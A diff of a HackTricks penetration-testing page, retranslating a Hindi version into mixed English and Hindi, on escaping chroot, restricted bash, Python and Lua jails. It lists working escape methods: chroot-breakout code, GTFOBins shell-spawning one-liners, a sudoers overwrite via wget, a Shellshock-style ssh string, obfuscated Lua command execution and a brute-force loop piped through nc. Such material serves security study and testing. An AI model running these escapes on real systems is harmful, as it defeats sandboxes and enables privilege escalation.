@@ -1,27 +1,27 @@
-# Jails से बाहर निकलना
+# Jails से बचना
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## **GTFOBins**
 
-**खोजें** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **यदि आप "Shell" प्रॉपर्टी के साथ कोई बाइनरी निष्पादित कर सकते हैं**
+**Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **if you can execute any binary with "Shell" property**
 
-## Chroot Escape
+## Chroot Escapes
 
-[विकिपीडिया](https://en.wikipedia.org/wiki/Chroot#Limitations) से: chroot तंत्र **जानबूझकर छेड़छाड़** के खिलाफ **privileged** (**root**) **उपयोगकर्ताओं** से **रक्षा** के लिए **नहीं है**। अधिकांश सिस्टम पर, chroot संदर्भ ठीक से स्टैक नहीं होते हैं और chrooted प्रोग्राम **पर्याप्त विशेषाधिकार के साथ एक दूसरा chroot करने में सक्षम हो सकते हैं**।\
-आमतौर पर इसका मतलब है कि बाहर निकलने के लिए आपको chroot के अंदर root होना चाहिए।
+From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** (**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.\
+Usually this means that to escape you need to be root inside the chroot.
 
 > [!TIP]
-> **उपकरण** [**chw00t**](https://github.com/earthquake/chw00t) को निम्नलिखित परिदृश्यों का दुरुपयोग करने और `chroot` से बाहर निकलने के लिए बनाया गया था।
+> The **tool** [**chw00t**](https://github.com/earthquake/chw00t) was created to abuse the following escenarios and scape from `chroot`.
 
 ### Root + CWD
 
 > [!WARNING]
-> यदि आप chroot के अंदर **root** हैं तो आप **दूसरा chroot** बनाकर **बाहर निकल सकते हैं**। इसका कारण यह है कि 2 chroots (Linux में) सह-अस्तित्व नहीं कर सकते, इसलिए यदि आप एक फ़ोल्डर बनाते हैं और फिर उस नए फ़ोल्डर पर **एक नया chroot** बनाते हैं जबकि **आप इसके बाहर हैं**, तो आप अब **नए chroot के बाहर** होंगे और इसलिए आप FS में होंगे।
+> If you are **root** inside a chroot you **can escape** creating **another chroot**. This because 2 chroots cannot coexists (in Linux), so if you create a folder and then **create a new chroot** on that new folder being **you outside of it**, you will now be **outside of the new chroot** and therefore you will be in the FS.
 >
-> यह इसलिए होता है क्योंकि आमतौर पर chroot आपकी कार्यशील निर्देशिका को निर्दिष्ट स्थान पर नहीं ले जाता है, इसलिए आप एक chroot बना सकते हैं लेकिन इसके बाहर रह सकते हैं।
+> This occurs because usually chroot DOESN'T move your working directory to the indicated one, so you can create a chroot but e outside of it.
 
-आमतौर पर आप chroot जेल के अंदर `chroot` बाइनरी नहीं पाएंगे, लेकिन आप **एक बाइनरी संकलित, अपलोड और निष्पादित** कर सकते हैं:
+Usually you won't find the `chroot` binary inside a chroot jail, but you **could compile, upload and execute** a binary:
 
 <details>
 
@@ -48,7 +48,7 @@ system("/bin/bash");
 
 <details>
 
-<summary>पायथन</summary>
+<summary>Python</summary>
 ```python
 #!/usr/bin/python
 import os
@@ -63,7 +63,7 @@ os.system("/bin/bash")
 
 <details>
 
-<summary>पर्ल</summary>
+<summary>Perl</summary>
 ```perl
 #!/usr/bin/perl
 mkdir "chroot-dir";
@@ -76,10 +76,10 @@ system("/bin/bash");
 ```
 </details>
 
-### रूट + सहेजा गया fd
+### Root + Saved fd
 
 > [!WARNING]
-> यह पिछले मामले के समान है, लेकिन इस मामले में **हमलावर वर्तमान निर्देशिका के लिए एक फ़ाइल डिस्क्रिप्टर को सहेजता है** और फिर **एक नए फ़ोल्डर में chroot बनाता है**। अंततः, चूंकि उसके पास **chroot के बाहर** उस **FD** तक **पहुँच** है, वह इसे एक्सेस करता है और वह **भाग निकलता है**।
+> यह पिछले case जैसा है, लेकिन इस case में **attacker वर्तमान directory का एक file descriptor store करता है** और फिर **chroot को एक नए folder में create करता है**। अंत में, क्योंकि उसके पास chroot के **outside** उस **FD** तक **access** है, वह उसे access करता है और **escapes**।
 
 <details>
 
@@ -109,62 +109,67 @@ chroot(".");
 ### Root + Fork + UDS (Unix Domain Sockets)
 
 > [!WARNING]
-> FD को Unix Domain Sockets के माध्यम से पास किया जा सकता है, इसलिए:
+> FD को Unix Domain Sockets के जरिए पास किया जा सकता है, इसलिए:
 >
-> - एक चाइल्ड प्रोसेस बनाएं (fork)
-> - UDS बनाएं ताकि पैरेंट और चाइल्ड बात कर सकें
-> - चाइल्ड प्रोसेस में एक अलग फोल्डर में chroot चलाएं
-> - पैरेंट प्रोसेस में, एक FD बनाएं जो नए चाइल्ड प्रोसेस के chroot के बाहर हो
-> - उस FD को UDS का उपयोग करके चाइल्ड प्रोसेस को पास करें
-> - चाइल्ड प्रोसेस उस FD में chdir करें, और क्योंकि यह अपने chroot के बाहर है, वह जेल से भाग जाएगा
+> - एक child process (fork) बनाएं
+> - UDS बनाएं ताकि parent और child बात कर सकें
+> - child process में chroot को एक अलग folder में चलाएं
+> - parent proc में, एक folder का FD बनाएं जो नए child proc chroot के बाहर हो
+> - उस FD को UDS का उपयोग करके child procc को पास करें
+> - child process उस FD पर chdir करे, और क्योंकि यह उसके chroot के बाहर है, वह jail से बाहर निकल जाएगा
 
 ### Root + Mount
 
 > [!WARNING]
 >
-> - च्रूट के अंदर एक डायरेक्टरी में रूट डिवाइस (/) को माउंट करना
-> - उस डायरेक्टरी में च्रूट करना
+> - root device (/) को chroot के अंदर एक directory में mount करना
+> - उस directory में chroot करना
 >
-> यह Linux में संभव है
+> Linux में यह संभव है
 
 ### Root + /proc
 
 > [!WARNING]
 >
-> - च्रूट के अंदर एक डायरेक्टरी में procfs को माउंट करें (यदि यह अभी तक नहीं है)
-> - एक pid देखें जिसमें एक अलग root/cwd एंट्री हो, जैसे: /proc/1/root
-> - उस एंट्री में च्रूट करें
+> - procfs को chroot के अंदर एक directory में mount करें (अगर यह पहले से नहीं है)
+> - ऐसे pid की तलाश करें जिसका root/cwd entry अलग हो, जैसे: /proc/1/root
+> - उस entry में chroot करें
 
 ### Root(?) + Fork
 
 > [!WARNING]
 >
-> - एक Fork (चाइल्ड प्रोसेस) बनाएं और FS में गहरे एक अलग फोल्डर में च्रूट करें और उस पर CD करें
-> - पैरेंट प्रोसेस से, उस फोल्डर को स्थानांतरित करें जहां चाइल्ड प्रोसेस च्रूट के बच्चों के च्रूट से पहले के फोल्डर में है
-> - यह चाइल्ड प्रोसेस खुद को च्रूट के बाहर पाएगा
+> - एक Fork (child proc) बनाएं और FS में और गहराई में एक अलग folder में chroot करें और उस पर CD करें
+> - parent process से, वह folder जिसमें child process है, उसे बच्चों के chroot से पहले वाले folder में ले जाएं
+> - यह children process खुद को chroot के बाहर पाएगा
 
 ### ptrace
 
 > [!WARNING]
 >
-> - कुछ समय पहले उपयोगकर्ता अपने ही प्रोसेस को अपने एक प्रोसेस से डिबग कर सकते थे... लेकिन अब यह डिफ़ॉल्ट रूप से संभव नहीं है
-> - फिर भी, यदि यह संभव है, तो आप एक प्रोसेस में ptrace कर सकते हैं और इसके अंदर एक shellcode निष्पादित कर सकते हैं ([इस उदाहरण को देखें](linux-capabilities.md#cap_sys_ptrace)).
+> - पहले users अपने ही processes को process of itself से debug कर सकते थे... लेकिन अब by default यह संभव नहीं है
+> - फिर भी, अगर यह संभव हो, तो आप एक process में ptrace कर सकते हैं और उसके अंदर shellcode execute कर सकते हैं ([see this example](linux-capabilities.md#cap_sys_ptrace)).
 
 ## Bash Jails
 
 ### Enumeration
 
-जेल के बारे में जानकारी प्राप्त करें:
+जेल के बारे में info प्राप्त करें:
 ```bash
+echo $0
 echo $SHELL
 echo $PATH
 env
 export
 pwd
+set -o
+compgen -c | sort -u
+enable -a
+type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
 ```
-### PATH को संशोधित करें
+### PATH को Modify करें
 
-जांचें कि क्या आप PATH env वेरिएबल को संशोधित कर सकते हैं
+जांचें कि क्या आप PATH env variable को modify कर सकते हैं
 ```bash
 echo $PATH #See the path of the executables that you can use
 PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
@@ -175,20 +180,58 @@ echo /home/* #List directory
 :set shell=/bin/sh
 :shell
 ```
-### स्क्रिप्ट बनाएं
+### Pagers and help viewers
 
-जांचें कि क्या आप _/bin/bash_ के रूप में सामग्री के साथ एक निष्पादन योग्य फ़ाइल बना सकते हैं
+कई restricted environments अभी भी **pagers** या **help viewers** उपलब्ध छोड़ देते हैं। इन्हें आमतौर पर `PATH` को फिर से rebuild करने की कोशिश से ज्यादा तेजी से abuse किया जा सकता है।
+```bash
+less /etc/hosts
+!/bin/sh
+
+man man
+!/bin/sh
+
+man '-H/bin/sh #' man
+```
+यदि `git` उपलब्ध है, तो याद रखें कि उसका help output आमतौर पर एक pager से होकर जाता है:
+```bash
+PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
+# Or: git help config
+# Then inside the pager: !/bin/sh
+```
+### Common GTFOBins one-liners
+
+एक बार जब आप जान लेते हैं कि कौन-सी binaries reachable हैं, तो पहले obvious shell spawners को test करें:
+```bash
+awk 'BEGIN {system("/bin/sh")}'
+find . -exec /bin/sh \; -quit
+tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
+script /dev/null -c bash
+ssh localhost /bin/sh
+```
+यदि आप केवल एक allowed command में **arguments inject** कर सकते हैं (इसके बजाय कि उसे freely run करें), तो **GTFOArgs** भी check करें।
+
+### Create script
+
+देखें कि क्या आप _/bin/bash_ को content के रूप में रखकर एक executable file बना सकते हैं
 ```bash
 red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
-### Get bash from SSH
+### SSH से bash प्राप्त करें
 
-यदि आप ssh के माध्यम से पहुँच रहे हैं, तो आप bash शेल निष्पादित करने के लिए इस तरकीब का उपयोग कर सकते हैं:
+यदि आप ssh के जरिए एक्सेस कर रहे हैं, तो आप अक्सर server से restricted login shell के बजाय एक **different program** execute करने के लिए कह सकते हैं:
 ```bash
 ssh -t user@<IP> bash # Get directly an interactive shell
+ssh user@<IP> -t "/bin/sh"
 ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
+```
+यदि `ssh` कुछ ही locally allowed binaries में से एक है, तो याद रखें कि इसे **GTFOBin** के रूप में भी abused किया जा सकता है:
+```bash
+ssh localhost /bin/sh
+ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
+ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
 ```
 ### घोषित करें
 ```bash
@@ -198,49 +241,60 @@ BASH_CMDS[shell]=/bin/bash;shell -i
 ```
 ### Wget
 
-आप उदाहरण के लिए sudoers फ़ाइल को ओवरराइट कर सकते हैं।
+आप उदाहरण के लिए sudoers file को overwrite कर सकते हैं
 ```bash
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
-### अन्य तरकीबें
+### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)
 
-[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
-[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
-[https://gtfobins.github.io](https://gtfobins.github.io)\
-**यह पृष्ठ भी दिलचस्प हो सकता है:**
+कुछ environments आपको plain `rbash` में नहीं, बल्कि **wrappers** जैसे `git-shell`, `rssh`, या `lshell` में डालते हैं:
 
+- `git-shell` सिर्फ server-side Git commands और `~/git-shell-commands/` के अंदर मौजूद किसी भी चीज़ को स्वीकार करता है। अगर वह directory मौजूद है, तो allowed custom actions को enumerate करने के लिए `help` चलाएँ। अगर आप वहाँ **write** कर सकते हैं, तो उस directory में dropped कोई भी executable reachable हो जाता है।
+- `rssh` / `lshell` आमतौर पर सिर्फ `scp`, `sftp`, `rsync`, या Git-style operations allow करते हैं। ऐसे cases में पहले **file write primitives** पर ध्यान दें: `authorized_keys`, shell startup file, या helper script को writable location में upload करें और फिर `ssh -t ...` के साथ reconnect करें।
+- अगर wrapper सिर्फ command line को filter करता है, तो reachable binaries enumerate करें और फिर **GTFOBins / GTFOArgs** पर pivot करें।
+
+### Other tricks
+
+Also check:
+
+- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
+- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
+- [**GTFOBins**](https://gtfobins.org/)
+- [**GTFOArgs**](https://gtfoargs.github.io/)
+
+**It could also be interesting the page:**
 
 {{#ref}}
 ../bypass-bash-restrictions/
 {{#endref}}
 
-## Python जेलें
+## Python Jails
 
-पायथन जेलों से escaping के बारे में तरकीबें निम्नलिखित पृष्ठ पर हैं:
+Tricks about escaping from python jails in the following page:
 
 
 {{#ref}}
 ../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
 {{#endref}}
 
-## Lua जेलें
+## Lua Jails
 
-इस पृष्ठ पर आप lua के अंदर आपके पास मौजूद वैश्विक कार्यों को पा सकते हैं: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)
+In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)
 
-**कमांड निष्पादन के साथ Eval:**
+**Eval with command execution:**
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
 ```
-कुछ तरकीबें **बिना डॉट का उपयोग किए एक पुस्तकालय के फ़ंक्शन कॉल करने के लिए**:
+कुछ tricks to **call functions of a library without using dots**:
 ```bash
 print(string.char(0x41, 0x42))
 print(rawget(string, "char")(0x41, 0x42))
 ```
-एक पुस्तकालय के कार्यों की गणना करें:
+किसी library के functions enumerate करें:
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
-ध्यान दें कि जब भी आप पिछले एक लाइनर को **अलग lua वातावरण में निष्पादित करते हैं, तो कार्यों का क्रम बदल जाता है**। इसलिए यदि आपको एक विशिष्ट कार्य को निष्पादित करने की आवश्यकता है, तो आप विभिन्न lua वातावरणों को लोड करके और le library के पहले कार्य को कॉल करके एक ब्रूट फोर्स हमला कर सकते हैं:
+ध्यान दें कि हर बार जब आप पिछला one liner किसी **different lua environment** में execute करते हैं, तो functions का order बदल जाता है। इसलिए यदि आपको कोई specific function execute करनी हो, तो आप different lua environments load करके और le library के first function को call करके brute force attack कर सकते हैं:
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
@@ -251,12 +305,14 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
-**इंटरैक्टिव lua शेल प्राप्त करें**: यदि आप एक सीमित lua शेल के अंदर हैं, तो आप एक नया lua शेल (और उम्मीद है कि अनलिमिटेड) प्राप्त कर सकते हैं:
+**इंटरैक्टिव lua shell प्राप्त करें**: अगर आप एक सीमित lua shell के अंदर हैं, तो आप यह कॉल करके एक नया lua shell (और उम्मीद है unlimited) प्राप्त कर सकते हैं:
 ```bash
 debug.debug()
 ```
-## संदर्भ
+## References
 
-- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (स्लाइड: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
+- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
+- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
+- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)
 
 {{#include ../../banners/hacktricks-training.md}}
